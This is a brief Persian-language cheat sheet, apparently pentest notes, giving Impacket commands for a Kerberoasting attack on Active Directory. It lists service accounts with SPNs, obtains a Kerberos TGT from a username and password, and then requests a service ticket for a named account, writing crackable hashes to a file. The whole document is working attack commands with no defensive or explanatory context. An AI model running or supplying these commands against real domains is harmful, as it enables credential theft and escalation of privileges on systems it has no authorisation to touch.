





# لیست کردن accountهای دارای SPN (بدون گرفتن hash)


```
impacket-GetUserSPNs DOMAIN.LOCAL/USERNAME:PASSWORD -dc-ip 10.10.10.10
```






# گرفتن TGT  
impacket-getTGT DOMAIN.LOCAL/USERNAME:PASSWORD -dc-ip 10.10.10.10  
  
# حالا استفاده از ticket  
```
export KRB5CCNAME=USERNAME.ccache  
impacket-GetUserSPNs DOMAIN.LOCAL/USERNAME -k -no-pass \  
-dc-ip 10.10.10.10 -request-user MVMD \  
-outputfile kerberoast.hashes
```